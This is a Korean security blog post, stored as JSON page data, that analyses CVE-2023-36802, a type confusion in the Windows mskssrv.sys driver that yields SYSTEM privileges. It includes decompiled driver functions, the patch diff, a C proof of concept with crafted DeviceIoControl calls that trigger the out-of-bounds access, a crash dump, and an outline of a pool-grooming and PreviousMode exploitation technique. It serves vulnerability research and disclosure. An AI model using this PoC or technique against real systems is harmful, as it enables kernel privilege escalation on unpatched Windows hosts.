{"pageProps":{"post":{"title":"N일 연속하여 모든 것을 탈취하는 방법 파트 6 - Windows 커널 LPE SYSTEM 얻기","description":"","date":"2024-05-23 15:21","slug":"2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM","content":"\n\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png)\n\n이 블로그 포스트는 저희가 X에서 시연한 1-day 풀 체인 익스플로잇에서 사용된 취약성에 대한 마지막 시리즈입니다. 이 블로그 포스트에서는 VMware의 제한된 권한에서 호스트 컴퓨터의 모든 권한을 얻기 위해 SYSTEM으로 권한 상승하는 방법을 소개할 것입니다. 취약성은 mskssrv.sys 드라이버에서 발생하는 CVE-2023-36802이며, 이는 이번 시리즈의 세 번째 블로그에서 다룬 CVE-2023-29360의 동일한 대상입니다.\n\n이 취약성은 실제로 악용되었으며 여러 위협 인텔리전스 그룹에 의해 감지되었습니다. IBM X-Force의 분석 보고서가 발표되었고 chompie1337의 PoC 코드가 10월에 공개된 가운데, 우리의 위협 인텔리전스 서비스인 Fermium-252는 이 취약성의 PoC와 익스플로잇을 모두 2023년 9월부터 보유하고 있습니다.\n\n# 세 번째 블로그를 상기해 보세요\n\n<div class=\"content-ad\"></div>\n\n이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.\n\n세 번째 블로그에 설명된 대로, 사용자는 IoControlCode가 0x2F0408일 때 FSRendezvousServer::PublishTx에 접근할 수 있습니다. 이 함수는 다음과 같습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::PublishTx(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  /**\n    입력 버퍼 유효성 검사\n  **/\n\n  FsContext2 = (const struct FSRegObject *)obj->FileObject->FsContext2;\n  // \"FsContext2\"를 FSRendezvousServer 개체 안에서 찾음\n  isfindobj = FSRendezvousServer::FindObject(this, FsContext2);\n  KeReleaseMutex((PRKMUTEX)((char *)this + 8), 0);\n  if (isfindobj)\n  {\n    (*(void(__fastcall **)(const struct FSRegObject *))(*(_QWORD *)FsContext2 + 0x38i64))(FsContext2); // FsStreamReg 잠금\n    // [*]. FSStreamReg::PublishTx 호출\n    result = FSStreamReg::PublishTx(FsContext2, data);\n```\n\n사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nFsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeStream(FSRendezvousServer *this, struct _IRP *irp)\n{\n  ...\n  // 버퍼 할당\n  buffer = (FSStreamReg *)operator new(0x1D8ui64, (enum _POOL_TYPE)irp, 0x67657253u); // FSStreamReg의 크기는 `0x1D8`입니다\n  if ( buffer )\n    FSStreamReg_obj = (volatile signed __int32 *)FSStreamReg::FSStreamReg(buffer); // FSStreamReg 설정\n  if ( !FSStreamReg_obj )\n    return 0xC000009A;\n  // FSStreamReg 초기화\n  if ( (unsigned int)Feature_Servicing_TeamsUsingMediaFoundationCrashes__private_IsEnabled() )\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, irp, v11, data, irp->RequestorMode);\n  else\n    result = FSStreamReg::Initialize((FSStreamReg *)FSStreamRegObj, v10, data, irp->RequestorMode);\n\n  ...\n  // FSStreamReg_obj를 FsContext2에 저장\n  obj->FileObject->FsContext2 = (PVOID)FSStreamReg_obj;\n  _InterlockedIncrement(FSStreamReg_obj + 6);\n  ...\n```\n\n# CVE-2023–36802\n\n위에서 언급한 대로, obj-`FileObject-`FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?\n\n<div class=\"content-ad\"></div>\n\nFSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.\n\n```js\nchar __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if ( FsContext2 )\n  {\n    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 ) \n    {\n      // Type number가 `1`인 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type1RegObj = *(_QWORD **)(this + 0x90);\n        if ( !Type1RegObj || (_QWORD *)*Type1ListHead == Type1ListHead || Type1RegObj == Type1ListHead )\n          break;\n        if ( Type1RegObj != (_QWORD *)8 && Type1RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x70));\n      }\n    }\n    else \n    {\n      // Type number가 `1`이 아닌 경우\n      ...\n      while ( 1 ) // RegObjectList를 검색합니다.\n      {\n        Type2RegObj = *(_QWORD **)(this + 0x60);\n        if ( !Type2RegObj || (_QWORD *)*Type2ListHead == Type2ListHead || Type2RegObj == Type2ListHead )\n          break;\n        if ( Type2RegObj != (_QWORD *)8 && Type2RegObj[3] == FsContext2 ) // FsContext2를 찾았습니다!!!\n          return 1;\n        FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x40));\n      }\n    }\n  }\n  return 0;\n}\n```\n\nFSRendezvousServer::FindObject는 FsContext2의 0x30 오프셋에 위치한 타입 번호에 따라 두 가지 종류의 객체가 있다는 것을 명시적으로 보여줍니다. FSStreamReg::FSStreamReg에서 FSStreamReg 타입의 생성자로부터, FSStreamReg의 타입 번호를 2로 알 수 있습니다.\n\n```js\n__int64 __fastcall FSStreamReg::FSStreamReg(__int64 FSStreamReg)\n{\n  ...\n  *(_QWORD *)FSStreamReg = &FSStreamReg::`vftable';\n  *(_QWORD *)(FSStreamReg + 0x20) = FSStreamReg;\n  *(_DWORD *)(FSStreamReg + 0x30) = 2;        // 타입 == 2\n  *(_DWORD *)(FSStreamReg + 0x34) = 0x1D8;    // 크기 == 0x1D8\n  ...\n  return FSStreamReg;\n}\n```\n\n<div class=\"content-ad\"></div>\n\nmskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.\n\n```js\n__int64 __fastcall FSRendezvousServer::InitializeContext(FSRendezvousServer *this, struct _IRP *a2)\n{\n  ...\n  FSContextReg = (__int64)operator new(0x78ui64, (enum _POOL_TYPE)a2, 0x67657243u);\n  if ( FSContextReg )\n  {\n    ...\n    *(_QWORD *)FSContextReg = &FSContextReg::`vftable'; // VTable 설정\n    *(_QWORD *)(FSContextReg + 0x20) = FSContextReg;\n    *(_DWORD *)(FSContextReg + 0x30) = 1;    // Type == 1\n    *(_DWORD *)(FSContextReg + 0x34) = 0x78; // Size == 0x78\n    ...\n  }\n  ...\n  obj->FileObject->FsContext2 = (PVOID)FSContextReg;\n  ...\n}\n```\n\nFSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0x1D8바이트) FSContextReg가 FSStreamReg를 상속받지 않는다는 것을 알 수 있습니다. 자식 클래스는 부모 클래스의 모든 필드를 상속받기 때문에, 자식 클래스는 동일하거나 더 큰 크기를 가져야 합니다. 또한, FSRendezvousServer::FindObject 이후 추가 유효성 검사 루틴이 있으며, FSContextReg는 FSStreamReg::PublishTx의 첫 번째 인수로 사용될 수 있습니다. 따라서, 타입 혼란 취약점이 발생합니다.\n\n타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n__int64 __fastcall FSStreamReg::PublishTx(__int64 FsStreamReg, __int64 data)\n{\n  //\n  result = FSStreamReg::CheckRecycle(FsStreamReg, data);\n  ...\n  // 경계를 벗어난 접근\n  kEvent = *(struct _KEVENT **)(FsStreamReg + 0x130);\n  if (kEvent)\n  {\n    KeSetEvent(kEvent, 0, 0);\n    FSFrameMdlobj = 0i64;\nLABEL_21:\n    if (FSFrameMdlobj)\n    {\n      FSFrameMdl::~FSFrameMdl(FSFrameMdlobj);\n      operator delete(FSFrameMdlobj);\n    }\n  }\n  ...\n}\n\n__int64 __fastcall FSStreamReg::CheckRecycle(__int64 this, __int64 data)\n{\n  if (data)\n  {\n    value1 = *(_DWORD *)(data + 0x24);\n    if (value1)\n    {\n      ...\n      // 경계를 벗어난 접근\n      v12 = *(_QWORD *)(this + 0x1B0);\n      v13 = v5 + *(_DWORD *)(this + 0x1BC);\n      v14 = *(int *)(this + 0x1B8);\n  ...\n}\n```\n\n두 객체 간 사이즈 차이로 인해 형태 혼란이 발생하여 경계를 벗어난 접근 취약점이 발생합니다. 공격자는 이러한 기본적인 취약점을 활용하여 메모리 레이아웃을 조작하여 시스템 권한을 획들할 수 있습니다.\n\n# CVE-2023–36802의 패치\n\n```js\n-char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n+char __fastcall FSRendezvousServer::FindStreamObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if (FsContext2)\n  {\n-    if (*(_DWORD *)(FsContext2 + 0x30) == 1) // 유형 1 확인\n-    {\n-      FsContextList = (_QWORD *)((char *)this + 0x80);\n-      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n-    }\n-    else\n+    if (*(_DWORD *)(FsContext2 + 0x30) == 2) // 유형 2 확인\n    {\n      FsStreamList = (_QWORD *)((char *)this + 80);\n      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n    }\n  }\n  return 0;\n}\n```\n\n<div class=\"content-ad\"></div>\n\nFSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.\n\n# 취약점 발생\n\n이 취약점을 발생시키기 위해서는 FSContextReg 오브젝트를 만들어야 합니다. 이 오브젝트는 FSRendezvousServer::InitializeContext에서 생성할 수 있으며, 이 함수는 IoControlCode가 0x2F0400일 때 호출됩니다.\n\n```js\n__int64 __fastcall FSInitializeContextRendezvous(struct _IRP *a1)\n{\n  ...\n  RendezvousServerObj = operator new(0xA0ui64, v3, 0x73767A52u);\n  if(RendezvousServerObj){\n    // RendezvousServerObj 초기화\n  }\n  ServerObj_1C0005048 = RendezvousServerObj_;\n  ...\n  // `FSRendezvousServer::InitializeContext`에서 FSContextReg 오브젝트 생성\n  result = FSRendezvousServer::InitializeContext(RendezvousServerObj, a1);\n  FSRendezvousServer::Release(RendezvousServerObj);\n  return result;\n}\n```\n\n<div class=\"content-ad\"></div>\n\n그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.\n\n아래 PoC는 FSStreamReg::PublishRx를 트리거하는 데 사용됩니다.\n\n```js\n#define inputsize 0x100\n#define outputsize 0x100\nint wmain(int argc, wchar_t** argv) {\n  WCHAR DeviceLink[256] = L\"\\\\\\\\?\\\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}\";\n  HANDLE hDevice = NULL;\n  NTSTATUS ntstatus = 0;\n  hDevice = CreateFile(\n    DeviceLink,\n    GENERIC_READ | GENERIC_WRITE,\n    0,\n    NULL,\n    OPEN_EXISTING,\n    0x80,\n    NULL\n  );\n  \n  PCHAR inputBuffer = (PCHAR)malloc(inputsize);\n  PCHAR outputBuffer = (PCHAR)malloc(outputsize);\n  \n  printf(\"[+] Initialize Rendezvous\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x00) = 0xffffffff; // &1 == Non ZERO\n  *(DWORD64*)(inputBuffer + 0x08) = GetCurrentProcessId(); // Current Process ID\n  *(DWORD64*)(inputBuffer + 0x10) = 0x4343434344444444; // Some Marker\n  *(DWORD64*)(inputBuffer + 0x18) = 0; // 0\n  ntstatus = DeviceIoControl(hDevice, 0x2F0400, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // FSInitializeContextRendezvous\n  \n  printf(\"[+] Publish RX --> Trigger OOB Access Vulnerability\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x20) = 1; // maxCnt\n  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt \n  *(DWORD64*)(inputBuffer + 0x30) = 0; // Some Value\n  ntstatus = DeviceIoControl(hDevice, 0x2F040C, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // PublishRx\n}\n```\n\nmskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n1: kd> r\nrax=ffffd5019f2d1668 rbx=0000000000000000 rcx=ffffbf8b77206f80\nrdx=ffffbf8b76e02b00 rsi=ffffbf8b77206f80 rdi=0000000000000000\nrip=fffff80ffac9c9f7 rsp=ffffd5019f2d1610 rbp=ffffbf8b77045e78\n r8=0000000000000001  r9=0000000000000001 r10=0000000000000000\nr11=ffffffffffffffff r12=0000000000000000 r13=ffffbf8b76d60cd0\nr14=ffffbf8b77207108 r15=ffffbf8b76e02b00\niopl=0         nv up ei pl nz na pe nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202\nMSKSSRV!FSStreamReg::PublishRx+0x43:\nfffff80f`fac9c9f7 4d3936          cmp     qword ptr [r14],r14 ds:002b:ffffbf8b`77207108=????????????????\n\n1: kd> dq @rcx L18\nffffbf8b`77206f80  fffff80f`fac941b8 ffffbf8b`77204fe0\nffffbf8b`77206f90  ffffbf8b`77204fe0 00000000`00000002\nffffbf8b`77206fa0  ffffbf8b`77206f80 00000000`00000001\nffffbf8b`77206fb0  00000078`00000001 ffffbf8b`7681f300\nffffbf8b`77206fc0  00000000`00000000 ffffbf8b`77204fd0\nffffbf8b`77206fd0  00000000`00000001 00000000`00001b80\nffffbf8b`77206fe0  43434343`44444444 00000000`00000000\nffffbf8b`77206ff0  00000000`00000000 b3b3b3b3`b3b3b3b3\nffffbf8b`77207000  ????????`???????? ????????`????????\nffffbf8b`77207010  ????????`???????? ????????`????????\nffffbf8b`77207020  ????????`???????? ????????`????????\nffffbf8b`77207030  ????????`???????? ????????`????????\n\n1: kd> pr\nKDTARGET: Refreshing KD connection\n\n*** Fatal System Error: 0x00000050\n                       (0xFFFFBF8B77207108,0x0000000000000000,0xFFFFF80FFAC9C9F7,0x0000000000000002)\n\nDriver at fault: \n***   MSKSSRV.sys - Address FFFFF80FFAC9C9F7 base at FFFFF80FFAC90000, DateStamp 75a6d2bb\n.\n\nA fatal system error has occurred.\nDebugger entered on first try; Bugcheck callbacks have not been invoked.\n\nA fatal system error has occurred.\n\nrax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003\nrdx=0000000000000070 rsi=0000000000000000 rdi=ffffd70001988180\nrip=fffff800470171e0 rsp=ffffd5019f2d0a28 rbp=ffffd5019f2d0b90\n r8=0000000000000065  r9=0000000000000000 r10=0000000000000000\nr11=0000000000000010 r12=0000000000000003 r13=ffffbf8b77207108\nr14=000000\n```\n\n<div class=\"content-ad\"></div>\n\nFSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다. \n\n그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.\n\n메모리 레이아웃이 네임드 파이프 객체에 의해 조작되면, 아래와 같이 됩니다.\n\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png)\n\n<div class=\"content-ad\"></div>\n\n위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.\n\n```js\nNTSTATUS __stdcall NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength)\n{\n  ...\n  switch (ThreadInformationClass)\n    ...\n    case ThreadNameInformation:\n      if (ThreadInformationLength == 16)\n      {\n        result = ObReferenceObjectByHandleWithTag(ThreadHandle, 0x400u, (POBJECT_TYPE)PsThreadType, prev_mode, 0x79517350u, &ThreadObj, 0i64);\n        ...\n        // 사용자 주소 유효성 검사 ~~~\n        *(UNICODE_STRING *)ThreadName_Unicode = *(UNICODE_STRING *)ThreadInformation;\n        ...\n        // [1]. 임의 크기의 Non-Paged Pool 할당\n        NameMem = (char *)ExAllocatePoolWithTag(NonPagedPoolNx, ThreadName_Unicode.Length + 16i64, 0x6D4E6854u);\n        ThreadName = (_UNICODE_STRING *)NameMem;\n        if (ThreadName)\n        {\n          // [2]. 사용자 데이터 시작 위치 +0x10\n          NameArea = (wchar_t *)(NameMem + 0x10);\n          ThreadName->Buffer = NameArea;\n          ThreadName->Length = ThreadName_Unicode.Length;\n          ThreadName->MaximumLength = ThreadName_Unicode.Length;\n          // 사용자 데이터를 메모리로 복사\n          memmove(NameArea, ThreadName_Unicode.Buffer, ThreadName_Unicode.Length);\n          ...\n          OldName = ThreadObj->ThreadName;\n          ThreadObj->ThreadName = ThreadName;\n          ...\n          // 이전 이름의 메모리를 해제합니다.\n          if (OldName)\n            ExFreePoolWithTag(OldName, 0x6D4E6854u);\n          ...\n        }\n      }\n  ...\n}\n```\n\nThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread 시스템 호출을 통해 설정할 수 있습니다. 이 개체는 원하는 크기로 NonPagedPool에 할당되며, 이 개체의 데이터는 처음 0x10바이트를 제외하고 완전히 제어 가능합니다 ([2]). 게다가, ThreadName 개체를 해제하는 코드도 있어서 홀을 만드는 데 유용합니다 ([8]).\n\n<img src=\"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png\" />\n\n<div class=\"content-ad\"></div>\n\n이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.\n\nFermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 익스플로잇 코드를 비롯한 자세한 정보가 있습니다. Fermium-252 서비스에 관심이 있다면 contacts@theori.io로 문의하십시오.\n\n# 결론\n\n이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.\n\n<div class=\"content-ad\"></div>\n\n# 참고 자료\n\n- [chompie1337의 GitHub 페이지](https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802)\n- [Nero22k의 GitHub 페이지](https://github.com/Nero22k/cve-2023-36802)\n- [보안 인텔리전스 기사](https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/)\n- [Microsoft 보안 업데이트 - CVE-2023-36802](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-36802)\n- [Google Project Zero의 보고서](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html)\n\n🔵 웹사이트: [theori.io](https://theori.io) ✉️ 이메일: vr@theori.io","ogImage":{"url":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png"},"coverImage":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png","tag":["Tech"],"readingTime":16},"content":{"compiledSource":"/*@jsxRuntime automatic @jsxImportSource react*/\nconst {Fragment: _Fragment, jsx: _jsx, jsxs: _jsxs} = arguments[0];\nconst {useMDXComponents: _provideComponents} = arguments[0];\nfunction _createMdxContent(props) {\n  const _components = Object.assign({\n    p: \"p\",\n    img: \"img\",\n    h1: \"h1\",\n    pre: \"pre\",\n    code: \"code\",\n    span: \"span\",\n    ul: \"ul\",\n    li: \"li\",\n    a: \"a\"\n  }, _provideComponents(), props.components);\n  return _jsxs(_Fragment, {\n    children: [_jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png\",\n        alt: \"이미지\"\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 블로그 포스트는 저희가 X에서 시연한 1-day 풀 체인 익스플로잇에서 사용된 취약성에 대한 마지막 시리즈입니다. 이 블로그 포스트에서는 VMware의 제한된 권한에서 호스트 컴퓨터의 모든 권한을 얻기 위해 SYSTEM으로 권한 상승하는 방법을 소개할 것입니다. 취약성은 mskssrv.sys 드라이버에서 발생하는 CVE-2023-36802이며, 이는 이번 시리즈의 세 번째 블로그에서 다룬 CVE-2023-29360의 동일한 대상입니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 취약성은 실제로 악용되었으며 여러 위협 인텔리전스 그룹에 의해 감지되었습니다. IBM X-Force의 분석 보고서가 발표되었고 chompie1337의 PoC 코드가 10월에 공개된 가운데, 우리의 위협 인텔리전스 서비스인 Fermium-252는 이 취약성의 PoC와 익스플로잇을 모두 2023년 9월부터 보유하고 있습니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"세 번째 블로그를 상기해 보세요\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"세 번째 블로그에 설명된 대로, 사용자는 IoControlCode가 0x2F0408일 때 FSRendezvousServer::PublishTx에 접근할 수 있습니다. 이 함수는 다음과 같습니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"PublishTx\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", struct _IRP *irp)\\n{\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"/**\\n    입력 버퍼 유효성 검사\\n  **/\"\n        }), \"\\n\\n  \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" = (\", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"const\"\n        }), \" struct \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRegObject\"\n        }), \" *)obj->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FileObject\"\n        }), \"->\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \";\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// \\\"FsContext2\\\"를 FSRendezvousServer 개체 안에서 찾음\"\n        }), \"\\n  isfindobj = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FindObject\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"KeReleaseMutex\"\n        }), \"((\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"PRKMUTEX\"\n        }), \")((char *)\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \" + \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"8\"\n        }), \"), \", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"0\"\n        }), \");\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" (isfindobj)\\n  {\\n    (*(\", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"void\"\n        }), \"(__fastcall **)(\", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"const\"\n        }), \" struct \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRegObject\"\n        }), \" *))(*(_QWORD *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \" + 0x38i64))(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \"); \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FsStreamReg 잠금\"\n        }), \"\\n    \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// [*]. FSStreamReg::PublishTx 호출\"\n        }), \"\\n    result = \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"PublishTx\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FsContext2\"\n        }), \", data);\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"FsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"__int64 __fastcall \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"InitializeStream\"\n        }), \"(\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSRendezvousServer\"\n        }), \" *\", _jsx(_components.span, {\n          className: \"hljs-variable language_\",\n          children: \"this\"\n        }), \", struct _IRP *irp)\\n{\\n  ...\\n  \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// 버퍼 할당\"\n        }), \"\\n  buffer = (\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \" *)operator \", _jsx(_components.span, {\n          className: \"hljs-title function_\",\n          children: \"new\"\n        }), \"(0x1D8ui64, (enum _POOL_TYPE)irp, 0x67657253u); \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FSStreamReg의 크기는 `0x1D8`입니다\"\n        }), \"\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( buffer )\\n    \", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"_obj = (volatile signed __int32 *)\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"::\", _jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"FSStreamReg\"\n        }), \"(buffer); \", _jsx(_components.span, {\n          className: \"hljs-comment\",\n          children: \"// FSStreamReg 설정\"\n        }), \"\\n  \", _jsx(_components.span, {\n          className: \"hljs-keyword\",\n          children: \"if\"\n        }), \" ( !\", 